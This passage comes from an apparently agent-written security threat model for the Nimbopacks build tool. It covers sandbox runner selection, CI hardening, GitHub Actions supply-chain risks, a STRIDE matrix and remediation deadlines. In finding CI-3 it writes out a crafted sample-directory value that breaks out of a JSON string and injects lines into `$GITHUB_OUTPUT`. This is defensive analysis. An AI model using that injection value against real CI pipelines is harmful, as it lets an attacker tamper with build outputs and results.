return ""
```

and `wolfi.go:89–92` appends `--runner docker` and prints
`→ Runner: docker (bubblewrap not available)`.

The two runners are not interchangeable security boundaries:

| | bubblewrap | docker |
|---|---|---|
| Privilege required | Unprivileged user namespace | Docker daemon, running as **root** on the host |
| Boundary | seccomp + userns, no host daemon | A root daemon the client can instruct |
| Failure mode of a sandbox escape | Escapes to the invoking user | Escapes to root |

The code picks the second one automatically, based on nothing but which binary happens to
be installed, and announces it as an informational line among dozens of build-log lines.
The thing being executed inside that boundary is `build.command` from `nimpack.yaml` —
i.e. §4.0's "this config is a shell script". **The isolation strength of the only barrier
between untrusted config and the host is chosen by `exec.LookPath`.**

**Honest limitation.** I have **not** demonstrated a host escape. Docker is not installed
in this environment, so melange's docker runner could not be exercised, and the precise
container configuration melange requests (privileged? socket mounted? user namespace
remapping?) is determined inside melange, not here, and I have not audited melange's
source. I am therefore **not** claiming "docker runner equals container escape".

**What I am claiming, and what I can demonstrate from this repository alone**, is the
control-downgrade defect: a security boundary is swapped for a materially different one
automatically, silently, and without the operator being asked. That is a finding on its
own terms regardless of how melange configures the container, and it is the part this
project owns and can fix. The incremental question — how much privilege the docker runner
actually grants — is a follow-up that needs Docker.

**Phase 1 mitigation.**

1. **Do not auto-select the docker runner.** When `bwrap` is absent, fail with an
   actionable error: *"bubblewrap not found. Install it (`apt install bubblewrap`), or
   re-run with `--runner docker` to build inside a Docker container managed by the host's
   root daemon — this is a weaker isolation boundary and your `build.command` will run
   with the daemon's privileges."*
2. Add `--runner` to the CLI and `build.runner` to nothing — keep it a **flag only**, not
   a `nimpack.yaml` field. A repository must not be able to choose its own sandbox
   strength; that is the operator's call, and making it a config field would re-create
   CFG-1's shape.
3. Print the selected runner in the build summary and in the SBOM's build metadata, so a
   consumer can tell which boundary produced an image.
4. Regression test: with a stubbed `exec.LookPath` reporting no `bwrap` and a present
   `docker`, `BuildPackage` must return an error and must not append `--runner docker`.

**Residual risk:** an operator who passes `--runner docker` accepts the weaker boundary
knowingly. Documented in `docs/security/`, and re-evaluated once melange's docker-runner
configuration can be audited with Docker available.

---

### RUN-2 — CI disables kernel unprivileged-userns hardening to make the sandbox work

| | |
|---|---|
| **Class** | Host hardening control disabled to accommodate a build sandbox |
| **STRIDE** | Elevation of privilege |
| **Severity** | **S2 Low** on GitHub-hosted runners / **S5 Critical** if ever copied to a self-hosted runner |
| **Exploitability** | **E5 Trivial** to reach the code path (any PR touching the matched paths) |
| **Owner** | Security Engineer |
| **Lenses** | Defense in Depth, Minimize Attack Surface |

`.github/workflows/samples.yml:66–70`:

```yaml
- name: Enable rootless melange (bubblewrap)
  run: |
    sudo apt-get update
    sudo apt-get install -y bubblewrap
    sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
```

The job then builds every affected sample, executing `build.command` from
`samples/**/nimpack.yaml` — files a fork PR can modify. The workflow trigger is
`pull_request` (not `pull_request_target`), so a fork PR gets a read-only `GITHUB_TOKEN`
and no secrets, and the runner is an ephemeral single-use VM. That containment is what
holds the severity to low **today**, and it is contingent on facts that are not written
down anywhere.

The durable risk is propagation: this is the snippet an enterprise adopter will copy into
their own pipeline, where the runner is long-lived, self-hosted, and shares a host with
other jobs. There it is a direct path from a PR to the kernel's unprivileged-userns attack
surface on a persistent machine.

**Phase 1 mitigation.** Keep the sysctl — it is necessary and acceptable on an ephemeral
GitHub-hosted runner — but make the reasoning explicit and non-copyable:

1. Add a comment block above it stating that it is safe **only** because the runner is
   ephemeral, single-tenant, and the trigger is `pull_request` with a read-only token, and
   that it **must not** be used on a self-hosted runner.
2. Add `if: runner.environment == 'github-hosted'` so the step cannot silently run on a
   self-hosted runner that someone later adds to the pool.
3. Document the self-hosted guidance in `docs/security/` before the first enterprise
   adopter asks.

**Residual risk:** accepted and recorded. Revisit if self-hosted runners are ever
introduced — that change requires security sign-off.

---

### RUN-3 — The published release image ships a shell

| | |
|---|---|
| **Class** | Deviation from the project's own minimal-runtime baseline (NIST SP 800-190 §4.5) |
| **STRIDE** | Elevation of privilege (post-compromise), Tampering |
| **Severity** | **S2 Low** |
| **Exploitability** | **E1 Theoretical** (requires prior code execution in the container) |
| **Owner** | CTO (product decision), Security Engineer (advice) |
| **Lenses** | Container hardening, Minimize Attack Surface |

`apko.yaml` ships `bash~5.3-r12` alongside `melange`, `apko`, and `grype`. The image
otherwise meets the baseline well: `run-as: 65532`, a `nonroot` user and group, explicit
entrypoint, `layering: {strategy: origin, budget: 10}`, no package manager.

The shell is **defensible** — `nimbopacks` executes melange, which executes build pipeline
`runs:` scripts, which need `/bin/sh`. This is a build tool, not an application runtime.
But it should be a recorded decision rather than an unexamined dependency, because
"minimal, no shell" is a claim the project makes about the images it *produces* and a
reader will reasonably apply it to the image it *ships*.

**Phase 1 mitigation.** Record it: a short ADR, or a note in `docs/security/`, stating
that the Nimbopacks tool image intentionally contains `bash` because melange pipelines
require a shell, that this does not apply to images Nimbopacks builds, and that
application images produced by the packs must remain shell-free by default with a `-dev`
variant as the opt-in.

**Residual risk:** accepted. Re-examine if a shell-free melange execution mode appears.

---

## 8. Surface 5 — GitHub Actions supply chain

**STRIDE: Tampering, Elevation of privilege, Spoofing, Repudiation.**

**What is already correct**, and must not regress: `permissions: contents: read` as the
default in every workflow; per-job elevation only where needed; `concurrency` groups;
`persist-credentials: false` in `scorecard.yml`; `BASE_REF` passed through `env:` rather
than interpolated into the shell in `commit-lint.yml` (the textbook expression-injection
defence, done right); Dependabot covering both `github-actions` and `gomod`; **no
`pull_request_target` anywhere**; and most third-party actions already SHA-pinned.

---

### CI-1 — Unpinned Wolfi package resolution inside the privileged signing step

| | |
|---|---|
| **Class** | Unpinned dependency resolution inside a step holding release-signing authority (TOCTOU on an upstream package channel) |
| **STRIDE** | Tampering, Spoofing |
| **Severity** | **S5 Critical** — it reaches a published, cosign-signed, Rekor-logged release |
| **Exploitability** | **E2 Hard** — requires compromising a Wolfi package |
| **Owner** | Security Engineer (with CTO for the SLSA roadmap) |
| **Lenses** | Supply chain (pin dependencies with committed lockfiles), Least Privilege |

`.github/workflows/release.yml:84–117`. The `oci-image` job holds `packages: write` and
`id-token: write` — i.e. the authority to push to GHCR *and* to obtain the OIDC token that
cosign uses for keyless signing. Inside it:

```yaml
- uses: wolfi-dev/wolfi-act@d78f3659c50c4520e222df428f4903a1c4b0c6ee # main
  with:
    packages: apko,cosign,crane
```

The *action* is SHA-pinned. The **packages it installs are not**: `apko,cosign,crane`
resolve to whatever Wolfi publishes at the moment the release runs. A compromised Wolfi
`cosign` or `apko` package executing at that moment has, in a single step: the GHCR push
token, the OIDC identity, and the content of the image about to be signed. It could
publish an arbitrary image under `ghcr.io/nimbostack/nimbopacks`, sign it with the
project's genuine identity, and have Rekor attest to it. Every downstream
`cosign verify` would pass.

This is the **highest-blast-radius finding in the model**: it is the one place where a
compromise produces a correctly-signed malicious release. Exploitability is low — Wolfi is
well defended — but the charter's target is SLSA Build L3, and L3 does not permit an
unpinned dependency inside the build-and-sign step.

**Secondary issues in the same workflow:**

- `goreleaser-action` with `version: latest` (`release.yml:34`) — the action is pinned, the
  GoReleaser binary it downloads is not.
- `chainguard-dev/actions/setup-melange@de68b87…  # main` and `wolfi-act@d78f365…  # main`
  are SHA-pinned to commits on a **moving branch**, so Dependabot bumps track `main`
  rather than tagged releases. The pin is sound; the review cadence is the gap.

**Phase 1 mitigation.**

1. Pin the Wolfi packages by exact version:
   `packages: apko=1.2.2-r1,cosign=<ver>,crane=<ver>` — the same discipline `apko.yaml`
   already applies with `melange~0.48.2-r1`. The project pins its own runtime packages but
   not its signing-step packages; close the inconsistency.
2. Pin `goreleaser-action`'s `version:` to an exact GoReleaser release.
3. Split the step: build/push with the GHCR token, then sign in a **separate step** that
   holds `id-token: write` but not the push token. Least Privilege — no single step should
   hold both "can publish" and "can sign".
4. Add a release-verification job that `cosign verify`s the published digest and checks
   the Rekor entry before the release is marked complete.

**Residual risk:** pinned versions must be bumped, and a bump is a trust decision. Route
`release.yml` and `apko.yaml` through CODEOWNERS (CI-4) so every bump gets security
sign-off.

---

### CI-2 — Release tags are not protected, so the signing workflow is not gated by merge authority

| | |
|---|---|
| **Class** | Missing authorisation gate on a privileged trigger (CWE-862) |
| **STRIDE** | Elevation of privilege, Spoofing, Repudiation |
| **Severity** | **S5 Critical** |
| **Exploitability** | **E3 Moderate** — requires repository write access, or a compromised workflow holding `contents: write` |
| **Owner** | CTO → Board (@NeoMotsumi); branch and tag protection are Board-only |
| **Lenses** | Least Privilege, CI/CD supply chain, Complete Mediation |

`release.yml:3–6` triggers on `push: tags: ['v*.*.*']`. Branch protection on `main` does
**not** protect tags — they are a separate GitHub ruleset. The governance model says "Merge
to `main`, create release tags: **Board only**", but today that is policy text, not an
enforced control.

Consequences: anyone with write access can push `v9.9.9` and trigger a signed GHCR release
from **arbitrary tree content**, bypassing every review gate on `main`. The `goreleaser`
job holds `contents: write`; a compromise there could create the tag that triggers the
`oci-image` job. And because the tag is the only record of what was released, a
force-pushed tag breaks attribution — the Repudiation leg of STRIDE.

**Phase 1 mitigation.**

1. **Tag protection ruleset on `v*`** — restrict tag creation and deletion to the Board,
   and block tag updates. Board action; I cannot set this and must not pretend otherwise.
2. Add a guard step at the top of `release.yml` that fails unless the tag's commit is an
   ancestor of `origin/main`. That is enforceable from this repository and catches
   releases cut from unreviewed trees.
3. Branch protection on `main`: required CODEOWNERS review, required status checks
   (CI + CodeQL + Scorecard), signed commits, linear history, no force pushes. Board
   action.

**Residual risk:** the Board's own account remains the trust root. Enforce 2FA/hardware
keys and require signed tags.

---

### CI-3 — `GITHUB_OUTPUT` / matrix injection via an attacker-controlled path component

| | |
|---|---|
| **Class** | Output injection into `$GITHUB_OUTPUT` from unsanitised filesystem input, feeding `fromJSON` (CWE-74 variant specific to Actions) |
| **STRIDE** | Tampering |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E4 Easy** — one directory added in a fork PR |
| **Owner** | Security Engineer |
| **Lenses** | Input handling (validate on format, reject ambiguous input), Agentic/tool-use (never let controlled strings reach an interpreter unsanitised) |

**Attack path.** `samples.yml:42–48` runs `./samples/affected-samples.sh` on the PR head
and writes its output with `echo "matrix=$matrix" >> "$GITHUB_OUTPUT"`. The script
(`samples/affected-samples.sh:31–35`) discovers sample names from disk:

```bash
mapfile -t ALL_SAMPLES < <(find "$repo_root/samples" -mindepth 3 -maxdepth 3 -name nimpack.yaml | sed ...)
```

and serialises them with `to_json_array` (`:49`), whose own comment states the assumption
that makes it a vulnerability:

```bash
# to_json_array <item...> — no jq dependency; sample names are always
# plain "lang/name" tokens, so no escaping is needed.
```

The names come from a PR-controlled directory tree, so the assumption does not hold. A PR
that adds `samples/go/foo"},{"x":"y/nimpack.yaml` breaks out of the JSON string. A PR that
adds a directory containing a **newline** — which git permits — injects a second line into
`$GITHUB_OUTPUT`, letting the attacker define arbitrary step outputs for the `changes`
job, which the `verify` job consumes via `fromJSON(needs.changes.outputs.matrix)`.

**Containment that limits this to medium:** the trigger is `pull_request`, so a fork PR
has a read-only token and no secrets, and the job already runs attacker-supplied build
commands by design. The injection does not currently cross a privilege boundary. It is
worth fixing anyway because (a) the same pattern is one `pull_request_target` away from
critical, (b) it can corrupt CI results and mask a failing sample, and (c) the fix is five
lines.

**Not demonstrated:** no PR was opened against the public repository to prove it — doing so
would be an unauthorised test against a live project. The path from `find` output to
`$GITHUB_OUTPUT` is traced line by line above and relies only on documented git and
Actions behaviour.

**Phase 1 mitigation.**

1. In `affected-samples.sh`, validate every discovered name against
   `^[a-z0-9][a-z0-9._-]*/[a-z0-9][a-z0-9._-]*$` and `exit 1` on any that fails, naming the
   offending path. A sample directory that is not a plain token is a bug in every case.
2. Replace `echo "matrix=$matrix" >> "$GITHUB_OUTPUT"` with the heredoc-delimited form:
   ```bash
   { echo "matrix<<__EOF__"; printf '%s\n' "$matrix"; echo "__EOF__"; } >> "$GITHUB_OUTPUT"
   ```
3. Regression test: a shell test that feeds the script a crafted directory name and
   asserts a non-zero exit.

**Residual risk:** none for this class once names are charset-validated.

---

### CI-4 — No `CODEOWNERS`, so the security sign-off rule has no enforcement mechanism

| | |
|---|---|
| **Class** | Governance control defined in policy but not enforced by configuration |
| **STRIDE** | Tampering, Repudiation |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E5 Trivial** |
| **Owner** | Security Engineer (author the file), Board (enable required review) |
| **Lenses** | Secure SDLC, Complete Mediation |

`.github/CODEOWNERS` does not exist — verified. The charter requires security sign-off on
any PR touching `internal/toolchain`, `internal/utils/tlsutil`, `pkg/backend`, or
`.github/workflows`, and OpenSSF Scorecard's Branch-Protection check expects it. Today
that rule depends entirely on a reviewer remembering it.

**Phase 1 mitigation.** Add `.github/CODEOWNERS`:

```
*                               @NeoMotsumi
/internal/toolchain/            @NeoMotsumi
/internal/utils/                @NeoMotsumi
/pkg/backend/                   @NeoMotsumi
/.github/workflows/             @NeoMotsumi
/docs/security/                 @NeoMotsumi
/apko.yaml                      @NeoMotsumi
/melange.yaml                   @NeoMotsumi
/.grype.yaml                    @NeoMotsumi
```

Agent reviewers have no GitHub identities, so the Board is the only reviewer GitHub can
enforce against today; the agent-side sign-off continues to run through Paperclip. Enabling
"Require review from Code Owners" is a Board action.

**Residual risk:** CODEOWNERS without required-review branch protection is advisory. Both
halves are needed; the file is the half this repository can ship.

---

### CI-5 — Checkout credentials persist into steps that execute repository-controlled code

| | |
|---|---|
| **Class** | Credential persistence in the workspace (CWE-522) |
| **STRIDE** | Information disclosure |
| **Severity** | **S2 Low** currently |
| **Exploitability** | **E4 Easy** |
| **Owner** | Security Engineer |
| **Lenses** | Secrets management, Least Privilege, Defense in Depth |

`actions/checkout` defaults to `persist-credentials: true`, writing an
`http.extraheader` auth token into `.git/config` on the runner. Only `scorecard.yml:28`
disables it. In `samples.yml` the job then runs `verify-builds.sh`, which drives melange
builds whose `build.command` comes from `samples/**/nimpack.yaml` — repository-controlled
code reading a credential from the filesystem.

Impact is currently low because fork-PR tokens are read-only and the workflow default is
`contents: read`. It is a defence-in-depth gap, and the fix is one line per checkout.

**Phase 1 mitigation.** Add `persist-credentials: false` to every `actions/checkout` step
except those that must push. `commit-lint.yml` and the `changes` job need
`fetch-depth: 0` but not credentials.

**Residual risk:** none meaningful.

---

### CI-6 — Three actions still referenced by mutable tag; no runner egress control; no SAST/secret/vuln floor

| | |
|---|---|
| **Class** | Mutable third-party action reference (supply-chain tampering); missing CI security controls |
| **STRIDE** | Tampering |
| **Severity** | **S4 High** (tag pins) / **S3 Medium** (missing controls) |
| **Exploitability** | **E2 Hard** (requires compromising the action's repository or its tag) |
| **Owner** | Security Engineer |
| **Lenses** | Supply chain, Secure SDLC, CI/CD |

Still tag-referenced, so a tag move silently changes the code that runs:

| Reference | Locations |
|---|---|
| `actions/setup-go@v5` | `ci.yml:21,39,52`, `codeql.yml:29`, `samples.yml:62` |
| `golangci/golangci-lint-action@v9` | `ci.yml:25` |
| `github/codeql-action/upload-sarif@v4` | `scorecard.yml:45` |

These are exactly the references OpenSSF Scorecard's Pinned-Dependencies check flags
against the ≥ 8.0 target. Note `release.yml:24` already pins `setup-go` by SHA, so the
repository is internally inconsistent — further evidence this is an oversight.

Missing controls: no `step-security/harden-runner` (no egress allowlisting or
network-call audit on any job); no `govulncheck`; no `gitleaks`; no `gosec` in
`.golangci.yaml`; no OSV-Scanner.

**Status.** Three local branches already address parts of this — `security/pin-github-actions`,
`security/ci-govulncheck`, `security/ci-gitleaks`. None is pushed; push authorisation is
pending with the Board. `harden-runner` and `gosec` are not yet started.

**Phase 1 mitigation.** Land the three existing branches; add `harden-runner` in
`audit` mode first (to learn the real egress set) then `block`; enable `gosec` in
`.golangci.yaml`.

**Residual risk:** `harden-runner` in `audit` mode detects but does not prevent. Move to
`block` after one week of audit data.

---

### CI-7 — Blanket `fix-state: unknown` suppression in `.grype.yaml`

| | |
|---|---|
| **Class** | Over-broad vulnerability suppression without per-finding justification |
| **STRIDE** | Information disclosure (of the project's true risk posture), Repudiation |
| **Severity** | **S3 Medium** |
| **Exploitability** | n/a — this is a policy defect, not an attack |
| **Owner** | Security Engineer |
| **Lenses** | Supply chain, Open Design |

`.grype.yaml` contains:

```yaml
ignore:
  - fix-state: unknown
```

This suppresses **every** finding whose fix state grype cannot determine — a category,
not a decision. It is a rule-shaped blanket waiver with no CVE list, no justification, and
no expiry, and it silently removes findings from the `update --check` gate that the public
exit-code contract (`0` clean / `1` at-or-above threshold / `2` error) is supposed to
report honestly.

The invariant "CVE matching is grype's job, Nimbopacks implements no suppression of its
own" is intact — the suppression lives in `.grype.yaml`, which is correct. The problem is
the *breadth* of this particular rule, not its location.

**Phase 1 mitigation.** Replace the category rule with explicit per-CVE entries, each
carrying a `vulnerability:` id and a reason, and back each with an **OpenVEX** document
under `docs/security/vex/` giving a machine-readable `not_affected` justification. If the
unknown-fix-state noise is genuinely unmanageable, downgrade rather than drop: keep those
findings visible in the report and exclude them from the `--fail-on` gate only, with a
dated review item.

**Residual risk:** per-CVE triage is ongoing work with an SLA (critical 7 days, high 30).
That is the intended cost.

---

## 9. STRIDE coverage matrix

| Surface | S | T | R | I | D | E |
|---|:-:|:-:|:-:|:-:|:-:|:-:|
| 1 — Untrusted `nimpack.yaml` | — | CFG-2,3,4 | — | **CFG-1**, CFG-2 | CFG-4 | CFG-3 |
| 2 — Toolchain downloads | TCH-2 | **TCH-1**, TCH-2 | — | — | TCH-3 | **TCH-1** |
| 3 — TLS / custom CAs | TLS-1, TLS-2 | TLS-1 | — | **TLS-3** | TLS-2 | — |
| 4 — Container runner | — | RUN-1 | — | — | — | **RUN-1**, RUN-2, RUN-3 |
| 5 — GitHub Actions | **CI-1**, CI-2 | **CI-1**, CI-3, CI-4, CI-6 | CI-2, CI-4, CI-7 | CI-5, CI-7 | — | **CI-2** |

Bold = the primary category for that threat. Repudiation is thin across the product
because a local CLI has no audit log to attack; it appears only where release provenance
is at stake.

---

## 10. Prioritised remediation list

Ordered by `severity × exploitability`, then by cost to fix. One branch and one PR each.
Dates assume a 2026-10-23 start and the SLA in `docs/security/README.md` (critical 7 days,
high 30 days).

### P0 — Start now

| # | Threat | Action | S×E | Owner | Due |
|---|---|---|---|---|---|
| 1 | **TCH-1** | Committed `toolchain.lock` + mandatory SHA-256 verification before install; temp-file-then-rename | S5·E4 | Security Engineer | **2026-10-30** |
| 2 | **TCH-2** | Exact asset-name allowlist from the lock; delete the substring/denylist matcher | S4·E2 | Security Engineer | **2026-10-30** |
| 3 | **CFG-1** | `srcDir` containment + mandatory PEM parsing in `LoadCACerts`; flip `inject_into_image` to default **false** | S4·E4 | Security Engineer | **2026-10-30** |
| 4 | **CI-1** | Pin Wolfi packages by exact version in `wolfi-act`; split push and sign into separate steps | S5·E2 | Security Engineer | **2026-10-30** |
| 5 | **CI-2** | Ancestor-of-`main` guard in `release.yml` (repo side) **+ Board: tag protection ruleset on `v*`** | S5·E3 | Security Eng + **Board** | **2026-10-30** |

### P1 — Within 30 days

| # | Threat | Action | S×E | Owner | Due |
|---|---|---|---|---|---|
| 6 | **CFG-4** | Call `config.Validate` from `pipeline.Build` and `update.Run`; add `KnownFields(true)`, a 1 MiB cap, and a `schema_version` check | S3·E5 | Security Engineer | 2026-11-22 |
| 7 | **CFG-2** | `project.name` charset validation (`^[a-z0-9][a-z0-9._-]{0,62}$`) | S4·E3 | Security Engineer | 2026-11-22 |
| 8 | **CFG-3** | `project.version` charset validation; reject `${{`; fuzz `config.Load` | S3·E3 | Security Engineer | 2026-11-22 |
| 9 | **RUN-1** | Remove the silent docker fallback; require explicit `--runner docker` | S4·E4 | Principal Architect + Security Engineer | 2026-11-22 |
| 10 | **TLS-1** | Remove `tls.insecure` from `nimpack.yaml`; hard-fail on it meanwhile; delete or wire `NewTLSConfig` | S3·E5 | Security Engineer | 2026-11-22 |
| 11 | **CI-6** | Land `security/pin-github-actions`, `security/ci-govulncheck`, `security/ci-gitleaks`; add `harden-runner` (audit) and `gosec` | S4·E2 | Security Engineer | 2026-11-22 |
| 12 | **TLS-3** | Move the CA bundle to the work dir at `0600`; `.gitignore` entry; signal-safe cleanup | S3·E3 | Security Engineer | 2026-11-22 |
| 13 | **CI-3** | Charset-validate sample names; heredoc `$GITHUB_OUTPUT` write | S3·E4 | Security Engineer | 2026-11-22 |
| 14 | **CI-4** | Add `.github/CODEOWNERS`; **Board: enable required Code Owner review** | S3·E5 | Security Eng + **Board** | 2026-11-22 |
| 15 | **CI-7** | Replace the blanket `fix-state: unknown` rule with per-CVE entries + OpenVEX docs | S3·n/a | Security Engineer | 2026-11-22 |

### P2 — Backlog, scheduled

| # | Threat | Action | S×E | Owner | Target |
|---|---|---|---|---|---|
| 16 | **TLS-2** | Append custom CAs to system roots in the sandbox instead of overriding `SSL_CERT_FILE`; route toolchain downloads through `NewTLSConfig` (**after** item 10) | S3·E4 | Security Engineer | 2026-12-15 |
| 17 | **TCH-1 ph.2** | cosign keyless verification + SLSA provenance for melange/apko/grype | S5·E2 | Security Engineer | 2026-12-15 |
| 18 | **CI-5** | `persist-credentials: false` on all non-pushing checkouts | S2·E4 | Security Engineer | 2026-12-15 |
| 19 | **TCH-3** | Client timeout, tar entry cap, lower `maxBinaryBytes`; regression test locking in the existing traversal defence | S2·E2 | Security Engineer | 2026-12-15 |
| 20 | **RUN-2** | Gate the sysctl on `runner.environment == 'github-hosted'`; document the self-hosted guidance | S2·E5 | Security Engineer | 2026-12-15 |
| 21 | **RUN-3** | ADR recording why the tool image ships `bash` and why that does not apply to produced images | S2·E1 | CTO + Security Engineer | 2026-12-15 |

### Board-only items (cannot be done by an agent)

- Tag protection ruleset on `v*` (item 5).
- Branch protection on `main`: required CODEOWNERS review, required status checks, signed
  commits, linear history, no force pushes (items 5, 14).
- Push authorisation for the three pending `security/*` branches (item 11).

---

## 11. Verification gaps in this revision

Stated plainly so the next revision knows what to close:

1. **No Docker in this environment.** Nothing requiring melange, apko, a grype scan, or an
   image build could be executed. CFG-1's final hop (bytes present in the image layer),
   CFG-3's expansion semantics, and RUN-1's actual docker-runner privilege level all rest
   on code reading plus documented upstream behaviour, not on execution. Each is flagged
   in place.
2. **No live testing against the public repository.** CI-3 was traced statically; opening
   a crafted PR to prove it would be unauthorised testing.
3. **melange's source was not audited.** The `${{ }}` expansion rules (CFG-3) and the
   docker runner's container configuration (RUN-1) are upstream behaviour. A follow-up
   should read melange's expansion implementation directly.
4. **`internal/remote/` is unwritten** and therefore unmodelled (§1.2).
5. **No fuzzing was run.** `go test -fuzz` targets over `config.Load` and
   `normalizeVersion` are proposed in items 6 and 8 but have not been executed.

## 12. Review and maintenance

- **Review cadence:** every minor release, and on any change to a §1.1 surface.
- **Security sign-off** is required on PRs touching `internal/toolchain`,
  `internal/utils/`, `pkg/backend`, or `.github/workflows` — enforced via CI-4 once
  CODEOWNERS and branch protection land.
- **Next revision must add:** `internal/remote/` when it exists; the registry push path;
  anything that introduces a network listener or an auth surface (which voids §1.3).
